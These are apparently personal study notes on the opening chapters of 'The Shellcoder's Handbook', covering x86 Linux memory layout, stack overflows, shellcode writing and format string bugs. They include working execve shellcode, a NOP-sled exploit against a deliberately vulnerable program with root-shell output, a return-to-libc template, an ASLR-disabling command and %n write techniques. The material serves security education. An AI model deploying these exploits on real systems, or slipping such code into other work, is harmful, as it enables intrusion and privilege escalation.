Shellcoder's Handbook Part 1: Intro to Exploitation: Linux on x86

# **Part 1: Intro to Exploitation: Linux on x86**

# Chapter 1: Before You Begin
- When a program is executed, it is laid out in an organized manner; various elements of the program are carefully mapped into memory
	- First, the operating system creates an address space in which programs will run. This addresss space includes the actual program instructions as well as any required data.
		- 3 Main Sections:
			- **.text** ---> mapped as read-only; holds the program's instructions
			- **.data** ---> mapped as writable; contains static *initialized* data
			- **.bss** ---> mapped as writable; contains *uninitialized* data
			- **Note:** .data & .bss are reserved for global variables
	- Next step is to initialize the stack and the heap
		- **Stack** ---> Last In First Out (LIFO) data structure that stores local variables, information relaing to function calls, and other information used to clean up the stack after a function or procedure is called. The stack *grows down the address space*, as more data is added to the stack, it is added at increasingly lower memory address values.
		- **Heap** ---> roughly a First In First Out (FIFO) data structure used to hold dynamic variables. Data is placed and removed from the heap as it builds. The heap *grows up the address space*. As data is added to the heap, it is added at increasingly higher address values.
	
- General purpose registers such as EAX, EBX, ECX, ESP (extended stack pointer) can be used to store data and addresses, offset addresses, perform counting functions, and many other things. 
- ESP points to the memory address where the next stack operation will take place

- C++ to x86 Assecmbly Example:
```
// C++
int number;
// ... more code ...
number ++;

// x86 Assembly
number dw 0
// ... more code ...
mov eax, number
inc eax
mov number, eax
```

* * * 

# Chapter 2: Stack Overflows
- A Buffer is defined as a limited, contiguosly allocated set of memory. The most common buffer in C is an array. 
- **Stack Overflows are possible because no inherent bounds-checking exists on buffers in the C or C++ languages.**
- **Side Note:** On Ubuntu 18.04 LTS the default version of GCC is 7.5.0; This version has the ```-fstack-protector``` flag enabled by default which triggers ```"Stack Smashing Detected"``` message as output when trying to intentionally cause a buffer overflow
	- To get around this either use GCC version 4.8 (or lower) by installing with ```apt install gcc-4.8``` and then compile with ```gcc-4.8 somefile.c``` OR use the ```-fno-stack-protector``` flag. 

- In *most* architecture, like Intel Architecture 32 (IA32), aka i368, ESP points to the last address used by the stack, which also should be the TOP of the stack, and therfore defines the boundary of the stack.

- Data is pushed onto the stack using the ```PUSH``` instruction
	- When ```PUSH``` is called the ESP register is decremented by the size of the data it is storing (because the stack grows down).
- Data is removed from the stack using the ```POP``` instruction
	- When ```POP``` is called the ESP register is incremented by the size of the data that is being removed

- The size of the data can be one of the following data types, or several blocks of the same data type tied together:
	1. Byte = 8 Bits
	2. Word = 16 Bits
	3. Dword = 32 Bits
	4. Qword = 64 Bits
	- There are designated instructions for defining data:
		- DB = Define Byte, allocates 1 Byte
		- DW = Define Word, allocates 2 Bytes
		- DD = Define DoubleWord, allocates 4 Bytes
		- DQ = Define QuadWord, allocates 8 Bytes
		- DT = Define Ten, allocates 10 Bytes

- Values are pushed onto the stack in the order of execution
	- For Functions with parameters, the parameters are added onto the stack in reverse order; from right to left.

- EBP, also called the stack base pointer, or frame pointer, is generally used to calculate an address relative to another addeess

- When looking at the Epilogue you can (generally) figure out how many variables are being defined by dividing the size of the allocation on the stack by 4 (1 Dword)
```
push ebp	// 1
mov ebp, esp	// 2
sub esp, 0Ch	// 3
```
- *Line 1:* The current value of ebp is pushed onto the stack because the value of ebp must be changed in order to reference values on the stack.
- *Line 2:* The base pointer (ebp) is set to the current location of the stack pointer (esp) so that the processor can remember where in memory this function began execution. 
- *Line 3:* Hex value 0C (12 in decimal) is being subtracted from the stack pointer to make way for variables. Dividing 12 by 4 yields 3 which is a good guess of how many variables are being defined.

- *See pages 15-16 for good explanation of return address placement before a function call.* In summary: RET is the address stored in the insturction pointer (EIP) at the time some_function() is called.

- There are many defense mechanisms designed to defeat arbitrary code execution, such as N^X bit (no execution bit) and Windows DEP, but many of the defenses can be beaten and rendered useless if attackers can simply reuse part of the target program to achieve their objective.

* * * 

### Basic Shellcode example
```
// shell.c
int main(){
    char *name[2];
    name[0] = “/bin/sh”;
    name[1] = 0x0;
    execve(name[0], name, 0x0);
    exit(0);
}
```
- This example spawns a (root?) shell by making use of the execve system call
	- In the below example, the shellcode array is more or less the opcode representation of ```shell.c```

```
// shellcode.c
char shellcode[] =
    “\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46”	
	“\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1”
    “\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68”;

int main() {			// 1
    int *ret;			// 2
    ret = (int *)&ret + 2;	// 3
    (*ret) = (int)shellcode;	// 4
}
```
- *Line 2:* Defines a variable on the stack, sets an int pointer
- *Line 3:* Lets the ret variable point to an int * that is placed two ints (aka 64 bits, because 1 int * is a 32-bit integer) above ret on the stack. Supposedly, that is where the return address is located; where the program will continue after main() returns.
- *Line 4:* The return address is set to the address of the shellcode array's contents, so tha shellcode's contents will be executed when main() returns.
- **NOTE:** To compile this code and get it to execture a shell on Ubuntu 18.04 using GCC version 7.4.0, I had to run the following command (the -m32 is optional): ```gcc -m32 -fno-stack-protector -z execstack ./shellcode.c -o shellcode```

## 
## 
- One of the most difficult tasks you face when trying to execute user-supplied shellcode is identifying the starting address of your shellcode. The most popular method is seen below (from "Smashing The Stack" in Phrack)
```
  // find_start.c
  unsigned long find_start(void)
  {
    __asm__(“movl %esp, %eax”);
  }
int main() {
     printf(“0x%x\n”,find_start());
  }
```
- ```find_start.c``` is a simple program to tell us the location of the stack pointer (ESP). Once we know the address of ESP, we simply need to guess the distance, or offset, from this address. The offset will be the first instruction in our shellcode.
	- This method works because for every program, the stack begins at the same address.
		- **Note:** This method will not work if there are enhanced security techniques employed,such as Address Stack Layout Randomization (ASLR), or you are using a distribution of linux with the gsecurity patch (or something similar).
##
##
```
// nop_attack.c
#include <stdlib.h>
#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90
char shellcode[] =
    “\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46”
    “\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1”
    “\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68”;

unsigned long get_sp(void) {
    __asm__(“movl %esp,%eax”);
}

void main(int argc, char *argv[])
{
char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
    int i;
    if (argc > 1) bsize  = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);
    if (!(buff = malloc(bsize))) {
        printf(“Can’t allocate memory.\n”);
        exit(0);
	}
    addr = get_sp() - offset;
    printf("Using address: 0x\%x\n", addr);
    
	ptr = buff;
	addr_ptr = (long *) ptr;
	
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;
		
	for (i = 0; i < bsize/2; i++)
    	buff[i] = NOP;
    	
    ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[bsize - 1] = '\0';
	memcpy(buff,"BUF=",4);
    putenv(buff);		// assigns to the env variable "BUF"
    system(“/bin/bash”);
}
```
```
// victim.c
int main(int argc,char *argv[])
{
  char little_array[512];
     if (argc > 1)
        strcpy(little_array,argv[1]);
}
```
- In ```victim.c``` argv[1] is a command line argument that is coppied into the little_array variable. A buffer overflow occurs if argv[1] is larger that 512 bytes.
- Command Line Example of using ```nop_attack.c``` on ```victim.c```:
```
[normaluser local]$ ./nop_attack 600
==> Using address: 0xbfffdd68

[normaluser local]$ ./victim $BUF
sh-2.05b# id
==> uid=0(root) gid=0(root) groups=0(root), 10(wheel)
```
- The reason this simple exploit works is because we can execute instructions stored on the stack... As a protection against this "Stack Execution," many operating systems will NOT allow programs to execute code from the stack.

### Beating Stack Execution Protections
- When you encounter a non-executable stack, you can use and exploitation method known as "**Return to libc**"
	- Essentially, you make use of the ever-present libc library to export system calls to the libc library which enables exploitation when the target is stack protected.
	- Instead of returning control to instructions on the stack, as is done in a traditional stack buffer overflow exploit, we will instead force the program to return to an affress that corresponds to a specific dynamic library function. This dynamic library function will not be on the stack. 
	- Ideally, this dynamic library function:
		1. is in a common dynamic library present in most programs, and...
		2. the function within the library should allow us as much flexibility as possible
- **libc is the standard C library**
	- The easiest libc funciton to use is ```system()``` which takes in an argument and executes that argument with ```/bin/sh```
		- To pop a shell with ```system()``` you must pass it a pointer to the string "/bin/sh"

- General Function Flow:
	- First, a ```CALL some_function``` instruction is executed. This ```CALL`` will push the address of the next insturction (where we want to return to) onto the stack. It will also decrement ESP by 4 (or the size of the arguments being passed to some_function). 
	- When we return from some_function, RET (or EIP) will be popped off the stack. 
	- ESP is then set to the address directly following RET. 

## 
- Steps to use Return to libc exploit with system():
	1. Determine the address of ```system()```
	2. Determine the address of ```/bin/sh```
	3. Find the address of ```exit()```, so we can close the exploited program cleanly
	- Since ```system()``` and ```exit()``` are part of libc and included into any compiled C or C++ program by default, we can open the program in GDB and set a breakpoint on main, then run ```print system``` and ```print exit``` to see the addresses of both functions.
	- To get the addess of ```/bin/sh```, you can either use a tool such as memfetch (http://lcamtuf.coredump.cx) OR you can store the ```/bin/sh``` string in an environment variable and then get the address of the variable.
	
##
- Short and simple exploit steps:
	1. Fill the vulnerable buffer up to the return address with garbage data.
	2. Overwirte the return address with the address of ```system()``` 
	3. Follow ```system()``` with the address of ```exit()```
	4. Append the address of ```/bin/sh```
- **NOTE:** Disable ALSR command: ```sudo /sbin/sysctl -w kernel.randomize_va_space=0```

```
#include <stdlib.h>
#define offset_size                    0
#define buffer_size                    600
char sc[] =
	“\xc0\xf2\x03\x42” //system()  // line 5
	“\x02\x9b\xb0\x42” //exit()	  // line 6
	“\xa0\x8a\xb2\x42” //binsh	 // line 7
unsigned long find_start(void) {
	__asm__(“movl %esp,%eax”);
}
int main(int argc, char *argv[])
{
	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset=offset_size, bsize=buffer_size;
    int i;
    if (argc > 1) bsize  = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);
	addr = find_start() - offset;
    ptr = buff;
	addr_ptr = (long *) ptr;
    for (i = 0; i < bsize; i+=4)
    	*(addr_ptr++) = addr;
   ptr += 4;
	for (i = 0; i < strlen(sc); i++)
    	*(ptr++) = sc[i];
   buff[bsize - 1] = ‘\0’;
	memcpy(buff,”BUF=”,4);
    putenv(buff);
    system(“/bin/bash”);
}
```
- Note: for line 5, 6, & 7 you would change these values to represent the little endian address of system(), exit(), and "/bin/sh" respectively. 

* * * 

# Chapter 3: Shellcode
- In order for a processor to execute all of your shellcode, your shellcode must not contain any null bytes (Ex: 00), otherwise it will terminate the process. 
	- Special tricks must be utilized to substitute out instructions that create null bytes with ones that do not while still achieving the same effect.

- We **cannont** use hardcoded addresses with shellcode. Hardcoded addresses reduce the likelihood of the shellcode working on different versions of Linux and in different vulnerable programs.
	- In order to get around this problem, you must use **Relative Addressing**.

- **Syscalls** are an extremely powerful set of funcitons that allow you to access operation system specific functions for things like getting input, producing output, exiting a process, and executing a binary file. 
	- Syscalls are the interface between protected kernel mode and user mode
		- When a user mode program atempts to access kernel memory space, an access exception is genereated, preventing the user mode program from directly accessing kernel memory space
	- 2 methods of executing syscalls in Linux:
		1. Use the C Library wrapper, libc, which works indirectly
		2. Execute the syscall directly with assembly by loading the appropriate arguments into registers and then calling a software interrupt
			- Linux Fastcall convention for Syscalls:
				1. The specific syscall nymber is loaded into EAX
				2. Arguments to the syscall function are placed in other registers
					- Each syscall can have a maximum of 6 arguments, which are inserted into EBX, ECX, EDX, ESI, EDI, and EPB respectively
					- If more than 6 arguments are required for the syscall, the arguments are passed via a data structure to the first argument. 
				3. The instruction ```int 0x80``` is executed
				4. The CPU switches to kernel mode
				5. The syscall function is executed

- ```gcc -static``` ---> prevents dynamic linking

- 5 Steps to Shellcode Success:
	1. Write desired shellcode in a high-level language
	2. Compile and disassemble the high-level shellcode program. 
	3. Analyze how the program works from an assembly level.
	4. Clean up the assembly to make it smaller and injectable.
	5. Extract opcodes and create shellcode.

- The first step is to create a simple C program to spawn our shell. The easiest and fastest method of creating a shell is to create a new process
	- 2 ways a process can be created in Linux:
		1. We can create a process via and existing prcess and replace the program that is already running (aka the original program).
		2. We can have the existing process make a copy of itself and run the new program in its place.
	- Using fork() and execve() together creates a copy of the existing process, while execve() singularly executes another program in place of the existing one.
## 
## execve()
Syntax:
```
int execve(const char *filename, char *const argv[], char *const envp[]);
```
**Syscall number 11 (decimal) or 0x0b (hex)**
- ```execve()``` executes the program pointed to by ```filename```. ```filename``` must be either a binary executable or a script starting with a line in the form of ```#! interpreter [arg]```. In the latter case the interpreter must be a valid pathname for an executable that is not itself a script and that will be invoked as ```interpreter [arg]``` filename.
- ```argv``` is an array of argument strings passed to the new program.
- ```envp``` is an array of strings, conventionally of the form ```key=value```, which are passed as environment to the new program.
- **Both ```argv``` and ```envp``` must be terminated by a null pointer.**
- We can safely assume that execve needs three arguments passed to it.
	- These three arguments must all be pointers. 
		- The first argument is a pointer to a string that is the name of binary we want to execute. 
		- The second is a pointer to the arguments array, which in our simplified case is the name of the program to be executed (bin/sh). 
		- The third and final argument is a pointer to the environment array, which we can leave at null because we do not need to pass this data in order to execute the syscall.
- **Note:** Because we are talking about passing pointers to strings, we need to remember to null terminate all the strings we pass. 
- Links: 
	- https://www.freebsd.org/cgi/man.cgi?query=execve&sektion=2&manpath=freebsd-release-ports
	- http://man7.org/linux/man-pages/man2/execve.2.html
- Example with a simple C program:
```
// spawnshell.c
#include <stdio.h>
int main()
{
	char *happy[2];
	happy[0] = “/bin/sh”; 
	happy[1] = NULL;
	execve (happy[0], happy, NULL);
}
```
- Compile and run with: ```gcc  -static –o spawnshell spawnshell.c```

*spawnshell.c Disassembled (relevant portions only):*
```
080481d0 <main>:
80481d0: 55			push   %ebp
80481d1: 89 e5			mov    %esp,%ebp
80481d3: 83 ec 08		sub    $0x8,%esp
80481d6: 83 e4 f0		and    $0xfffffff0,%esp
80481d9: b8 00 00 00 00		mov    $0x0,%eax
80481de: 29 c4			sub    %eax,%esp
80481e0: c7 45 f8 88 ef 08 08	movl   $0x808ef88,0xfffffff8(%ebp)
80481e7: c7 45 fc 00 00 00 00	movl   $0x0,0xfffffffc(%ebp)
80481ee: 83 ec 04		sub    $0x4,%esp
80481f1: 6a 00			push   $0x0
80481f3: 8d 45 f8		lea    0xfffffff8(%ebp),%eax
80481f6: 50			push   %eax
80481f7: ff 75 f8		pushl  0xfffffff8(%ebp)
80481fa: e8 f1 57 00 00		call   804d9f0 <__execve>
80481ff: 83 c4 10		add    $0x10,%esp
8048202: c9			leave
8048203: c3			ret

0804d9f0 <__execve>: 
804d9f0: 55			push   %ebp
804d9f1: b8 00 00 00 00		mov    $0x0,%eax
804d9f6: 89 e5			mov    %esp,%ebp
804d9f8: 85 c0			test   %eax,%eax
804d9fa: 57			push   %edi
804d9fb: 53			push   %ebx
804d9fc: 8b 7d 08		mov    0x8(%ebp),%edi
804d9ff: 74 05			je     804da06 <__execve+0x16>
804da01: e8 fa 25 fb f7		call   0 <_init-0x80480b4>
804da06: 8b 4d 0c		mov    0xc(%ebp),%ecx
804da09: 8b 55 10		mov    0x10(%ebp),%edx
804da0c: 53			push   %ebx
804da0d: 89 fb			mov    %edi,%ebx
804da0f: b8 0b 00 00 00		mov    $0xb,%eax
804da14: cd 80			int    $0x80
804da16: 5b			pop    %ebx
804da17: 3d 00 f0 ff ff		cmp    $0xfffff000,%eax
804da1c: 89 c3			mov    %eax,%ebx
804da1e: 77 06			ja     804da26 <__execve+0x36>
804da20: 89 d8			mov    %ebx,%eax
804da22: 5b			pop    %ebx
804da23: 5f			pop    %edi
804da24: c9			leave
804da25: c3			ret
804da26: f7 db			neg    %ebx
804da28: e8 cf ab ff ff		call    80485fc <__errno_location>
804da2d: 89 18			mov    %ebx,(%eax)
804da2f: bb ff ff ff ff		mov    $0xffffffff,%ebx
804da34: eb ea			jmp    804da20 <__execve+0x30>
804da36: 90			nop
804da37: 90			nop
```
- Note: The above example is AT&T assembly syntax
- See page 53 - 54 for more explaination


## Relative Addressing
- As mentioned above, relative addressing is essential to ensuring that our shellcode is portable.
- The trick to creating meaningful relative addressing in shellcode is to place the address of where shellcode starts in memory or an important element of the shellcode into a register. We can then craft all our instructions to reference the known distance from the address stored in the register.
	- The classic method of performing this trick is to start the shellcode with a jump instruction, which will jump past the meat of the shellcode diretly to a call instruction. 
		- Jumping directly to a call instruction sets up relative addressing.
		- When the call instruction is executed, the address of the instruction immediately following the call instruction will be pushed onto the stack. 
		- **The trick is to place whatever you want as the base relative address directly following the call instruction**
			- This causes our base address to be stored on the stack, without having to know what the address was ahead of time.
	- After the jump instruction, we will call the instuction immediatley following our original jump. This will put the contril of execution right back to the beginning of our shellcode. 
	- After the call instruction, we must ue a ```POP ESI``` instruction, which will pop the value of our base address off the stack and put it into ```ESI```. 


- In Summary, Relative Addressing can be set up in 3 steps:
	1. Start with a JUMP instruction to jump past meat of shellcode and directly to a CALL instruction. 
	2. CALL instruction is jumped to and executed, the address of the insturction immediately following the CALL instruction will be pushed onto the stack. The CALL instruction will call the instruction immediately following our original JUMP.
	3. The CALL instruction takes us to a function location. The first instuction in this function must be ```POP ESI``` which will pop the value of our base address off the stack and put it into ESI. 
	- **Now we can reference different bytes in our shellcode by using the distance, or offset, from ESI**

Pseudocode Example:
```
  jmp short	GotoCall

shellcode:
  pop		esi 
  ...
  <shellcode meat>
  ...

GotoCall:
  call		shellcode
  db		'/bin/sh'
```
- Code Explaination:
	1. The first instruction is to jump to GotoCall, which immediately executes the CALL instruction.
	2. The CALL instruction now stores the address of the first byte of our string (/bin/sh) on the stack.
	3. The CALL instruction calls shellcode.
	4. The first instruction in our shellcode is ```POP ESI```, which puts the value of the address of our string into ESI.
	5. The meat of the shellcode can now be executed using relative addressing.
- The DB or *define byte* directive (it's not technically an instruction) allows us to set aside space in memory for a string. 

##
- Consider the string with a 9 byte placeholder at the end: "/bin/shJAAAAKKKK"
	- The placeholders will be copied over by the data we want ot load into 2 of 3 syscall argument registers (ECX, EDX).
	- We can easily determine the memory address locations of these values for replacing and copying into registers, becasue we will have the address of the first byte of the string stored in ESI.
	- Additionally, we can terminate our string with a null efficiently by using this "**copy over the placeholder**" method, following these steps:
		1. Fill ```EAX``` with nulls by xor-ing ```EAX``` with itself.
		2. Terminate our ```/bin/sh``` string by copying ```AL``` over the last byte of the string.
			- Remember that ```AL``` is null because we nulled out ```EAX``` in the previous instruction. You must also calulate the offset from the beginning of the string to the "J" placeholder.
		3. Get the address of the beginning of the string, which is stored in ```ESI```, and copy that value into ```EBX```. 
		4. Copy the value stored in ```EBX```, now the address of the beginning of the string, over the "AAAA" placeholders.
			- This is the argument pointer to the binary to be executed, which is required by ```execve()```. Again, you need to calculate the offset.
		5. Copy the nulls still stored in ```EAX``` over the "KKKK" placeholders, using the correct offset.
		6. ```EAX``` no longer needs to be filled with nulls, so copy the value of our ```execve()``` syscall (0x0b) into ```AL```.
		7. Load ```EBX``` with the address of our string.
		8. Load the address of the value stored in the "AAAA" placeholder, which is a pointer to our string, into ```ECX```.
		9. Load up ```EDX``` with the address of the value in "KKKK", a pointer to null.
		10. Execute ```int 0x80```.

 
##
- The final assembly code that will be translated into shellcode looks like this:
```
Section		.text
  global _start
  
_start:
  jmp short	GotoCall
  
shellcode:
  pop		esi
  xor		eax, eax
  mov byte	[esi + 7], al
  lea		ebx, [esi]
  mov long	[esi + 8], ebx
  mov long	[esi + 12], eax
  mov byte	al, 0x0b
  lea		ecx, [esi + 8]
  lea		edx, [esi + 12]
  int		0x80
  
GotoCall:
  call		shellcode
  db		'/bin/shJAAAAKKKK'
```

- Compile and disassemble to get opcodes:
```
[root@linux]# nasm -f elf execve2.asm
// compiles the execve2.asm assembly file into  
//   an object file called execve2.o
[root@linux]# ld -o execve2 execve2.o
// links the object file to create an executable

[root@linux]# objdump -d execve2

execve2:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080: eb 1a			jmp    804809c <GotoCall>

08048082 <shellcode>:
 8048082: 5e			pop    %esi
 8048083: 31 c0			xor    %eax,%eax
 8048085: 88 46 07		mov    %al,0x7(%esi)
 8048088: 8d 1e			lea    (%esi),%ebx
 804808a: 89 5e 08		mov    %ebx,0x8(%esi)
 804808d: 89 46 0c		mov    %eax,0xc(%esi)
 8048090: b0 0b			mov    $0xb,%al
 8048092: 89 f3			mov    %esi,%ebx
 8048094: 8d 4e 08		lea    0x8(%esi),%ecx
 8048097: 8d 56 0c		lea    0xc(%esi),%edx
 804809a: cd 80			int    $0x80

0804809c <GotoCall>:
 804809c: e8 e1 ff ff ff	call   8048082 <shellcode>
 80480a1: 2f			das
 80480a2: 62 69 6e		bound  %ebp,0x6e(%ecx)
 80480a5: 2f			das			
 80480a6: 73 68 		jae    8048110 <GotoCall+0x74>
 80480a8: 4a			dec    %edx
 80480a9: 41			inc    %ecx
 80480aa: 41			inc    %ecx
 80480ab: 41			inc    %ecx
 80480ac: 41			inc    %ecx
 80480ad: 4b			dec    %ebx
 80480ae: 4b			dec    %ebx
 80480af: 4b			dec    %ebx
 80480b0: 4b			dec    %ebx
```
- Notice that we have no nulls and no hardcoded addresses.

- The final step is to create the shellcode and plug it into a C program:
```
char shellcode[] =
    “\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46”
	“\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1”
	“\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41”
	“\x4b\x4b\x4b\x4b”;
	
int main() {
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}
```
- Testing to ensure our shellcode works:
```
[root@linux]# gcc execve2.c -o execve
[root@linux]# ./execve
sh-2.05b#
```

- Now you have working, injectable shellcode. If you need to pare down the shellcode, you can sometimes remove the placeholder opcodes at the end of shellcode, as follows:
```
char shellcode[] =
	“\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46”
	“\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1”
	“\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68”;
```

* * * 
# Chapter 4: Introduction to Format String Bugs
- A format string bug occurs when user-supplied data is included in the format specification string of one of the printf family of functions, including:
	- printf
	- fprintf
	- sprintf
	- snprintf
	- vfprintf
	- vprintf
	- vsprintf
	- vsnprintf
- and any similar functions on your platform that accept a string that can con- tain C-style format specifiers, such as the wprintf functions on the Windows platforms.
- The attacker supplies a number of format specifiers that have no corresponding arguments on the stack, and values from the stack are used in their place. 
	- This leads to information disclosure and potentially the execution of arbitrary code.

- A format specifier follows this prototype:
	- ```%[flags][width][.precision][length]specifier```

| Specifier | Output | 
| :---: | :---: |  
| %c      | A Single Character |
| %d | Signed Integer (Assumes base 10) |
| %e or %E	| Scientific notation of floats	|
| %f | Float Values |
| %g or %G |	Use the shortest representation: %e or %f |
| %hi | Signed Integer (Short) |
| %hu | Unsigned Integer (Short) |
| %u | Unsigned integer |
| %i | Unsigned Integer (Detects Base Automatically)|
| %l or %ld or %ll | Long |
| %lf | Double |
| %Lf | Long Double |
| %lu | Unsigned Int or Unsigned Long |
| %lli or %lld | Long Long |
| %llu | Unsigned Long Long |
| **%n** | Prints Nothing - **The argument is treated as a pointer to an integer (or integer variant such as short). The number of characters output so far is stored in the addresse pointed to by the argument.** |
| %o | Octal Representation (Base 8) |
| %p | Pointer (Address) |
| **%s** | String - **The argument is treated as a pointer to a string. The string is substituted into the output.** |
| %u | Unsigned Integer |
| %x or %X | Hexadecimal Representation (Base 16) |
| %% | Prints "%" Character |

|Width|Description|
|:---:|:---:|
|(number) | Minimum number of characters to be printed. If the value to be printed is shorter than this number, the result is padded with blank spaces. The value is not truncated even if the result is larger. |
| * |	The width is not specified in the format string, but as an additional integer value argument preceding the argument that has to be formatted. |

- Links:
	- https://www.freecodecamp.org/news/format-specifiers-in-c/
	- https://www.tutorialspoint.com/format-specifiers-in-c
	- http://www.cplusplus.com/reference/cstdio/printf/
		- To see more info on flags, precision, and length fields

- Example: we can use the precision specifier to control the number of characters output; if we want to output 50 characters, we can specify %050x, which will output a hexadecimal integer padded with leading zeros until it contains exactly 50 digits.

- We can run arbitrary code because the following conditions exist:
	- We can control the values of the arguments, and we can write the number of characters output to anywhere in memory.
	- The width specifier allows us to pad output to an almost arbitrary length - certainly to 255 characters. We can overwrite a single byte with the value of our choise
	- We can do this 4 times, so we can overwrite almost any 4 bytes with the value of our choice. Overwriting 4 bytes allows the attacker to overwrite addresses. We might have problems writing to addresses with 00 bytes becase the 00 byte terminates a string in C. We can probably get around these problems by writing 2 bytes starting at the address before it, however. 
	- Because we can generally guess the address of a function pointer (saved return address, binary import table, C++ vtable) we can cause a string that we supply to be executed as code. 

- Common Misconceptions Relating to Format String Attacks:
	- They don't just addect Unix.
	- They aren't necessarily stack based.
	- Stack protection mechanisms will not generally defend against them.
	- They can generally be detected with static code analysis tools. 

- To summarize, a format string bug occurs when user-supplied data is included in the format specification string of one of the printf family of functions. The attacker supplies a number of format specifiers that have no corresponding arguments on the stack, and values from the stack are used in their place. This leads to information disclosure and potentially the execution of arbitrary code. 
	- When a printf family function is called, the parameters to the function are passed on the stack. As we mentioned earlier, if too few parameters are passed to the function, the printf function will take the next values from the stack and use those instead.

- Format String Vulnerable Program Example:
```
// fmt.c
#include <stdio.h>
#include <stdlib.h>
int main( int argc, char *argv[] )
{
	if( argc != 2 )
	{
		printf(“Error - supply a format string please\n”);
		return 1;
	}
	printf( argv[1] );
	printf( “\n” );
	return 0;
}
```
- By Compiling: ```cc fmt.c -o fmt``` and Running: ```./fmt "%x %x %x %x"``` , we are effectively calling *printf* like this: ```printf("%x %x %x %x");```
	- The important thing here is that although we have supplied the format string, we haven’t supplied the four numeric variables to be substituted into the string
	- Interestingly, *printf* does not fail and instead produces and output that looks like this: ```4015c98c 4001526c bffff944 bffff8e8```
	
- **Meaningful Targets to Overwrite Using Format Strings:**
	- The saved return address (a straight stack overflow; use information disclosure techniques to determine the location of the return address)
	- The Global Offset Table (GOT) (dynamic relocations for functions; great if someone is using the same binary as you are; for example, rpm)
	- The destructors (DTORS) table (destructors get called just before *exit*)
	- C lobrary hooks such as malloc_hook, realloc_hook, and free_hook
	- The atexit structure (see the man atexit)
	- Any other function pointers, such as C++ vtables, callbacks and so on
	- In Windows, the default unhandled exception handler, which is (nearly) always at the same address
	
- Format String exploits are possible because of a fundamental problem with the way that functions with variable numbers of parameters are handled in C.
	- To declare a function with a variable number of parameters, you use the *ellipsis* syntax, like this: ```void foo(char *fmt, ...)```
		- For more info see `man v_arg`
	- When your function gets called, you use the `va_start` macro to tell the standard C library where your variable argument list starts. You then repeatedly call the `va_arg` macro to get arguments off the stack, and then you call the `va_end` macro to tell the standard C library that you’re finished with your variable argument list. 
		- The problem with this is that at no point have you been able to determine how many arguments you were passed, so you must rely on some other mechanism to tell you, such as data within a format string or an argument that’s NULL: `foo(1,2,3, NULL)`
		- In theory, any C funtion that accepts a variable number of arguments is potentailly vulnerable to the same problem - it can't tell when its argument list ends.
	- To summarize, the bug is all the fault of ANSI and C89, and has little or nothing to do with any implementer of the C standard library.

##
## Format String Technique Roundup:
1. If the format string is on the stack, we can supply the parameters that are used when we add format string specifiers to the string. If we're brute forcing offsets for a format string exploit, one of the offsets we have to guess is the number of parameters we have to use before we get to the start of our format string.
	- Once we can specify parameters:
		- We can read memory from the target process using the `%s` specifer.
		- We can write the number of characters output so far to an arbitrary address using the `%n` specifier.
		- We can modify the number of characters output so far using width modifiers.
		- We can use the `%hn` modifier to write numbers 16 bits at a time, which allows us to write values of our choice to locations of our choice.
2.  If the address that we want to write to contains one or more null bytes, you can still use `%n` to write to it, but you must do this in two stages. 
	1. First, write the address that you want to write to into one of the parameters on the stack (you must know where the stack is in order to do this). 
	2. Then, use `%n` to write to the address using the parameter you wrote to the stack.
		- Alternatively, if the zero byte in the address happens to be the leading byte (as is often the case in Windows format string exploits) you can use the trailing null byte of the format string itself.
3. Direct parameter access (in the Linux implementations of `printf` family) allows us to resue stack parameters multiple times in the same format string as well as allowing us to directly use only those parameters that we are interested in. Direct parameter access involves using the `$` modifier; for example: `%272$x` will print the 272nd parameter from the stack. This is an immensely valuable technique.
4. If for some reason we can't use `%hn` to write our 16 bits at a time, we can still use byte-alligned writes and `%n:` we just do four writes rahter than one and pad our numbers of characters output so that we're writing the low order byte each time.
	- The disadvantage of this technique is that we overwrite the 3 bytes after the 4 bytes we're writing. Depending on memory layout, this may not be important. This problem is one of the reasons why exploiting format string bugs on Windows is fiddly.
- A few things you can do with format string exploits:
	- Overwrite the saved return address. To do this, we must workout the address of the saved return address, which means guesswork, brute force, or information disclosure.
	- Overwrite another application-specific funciton pointer. This technique is unlikely to be easy since many programs don’t leave function pointers available to you. However, you might find something useful if your target is a C++ application.
	- Overwrite a pointer to an exception handler, then cause an exception. This is extremely likely to work, and involves eminently guessable addresses.
	- Overwrite a GOT entry. See wu-ftpd example in book.
	- Overwrite the `atexit` handler. you may or may not be able to use this technique, depending on the target.
	- Overwrite entries in the DTORS section. For this technique, see the paper by Juan M. Bello Rivas in the bibliography. 
	- Turn a format string bug into a stack or heap overflow by overwriting a null terminator with non-null data. This is tricky, but can yield cool results. 
	- Write application-specific data such as stored UID or GID values with values of your choice.
	- Modify strings containing commands to reflect commands of your choice.

- If we can't run code on the stack, we can easily bypass the problem by the following: 
	- Writing shellcode to the location of your choice in memory, using the `%n-` type specifiers. (Did this in wu-ftpd example in book.)
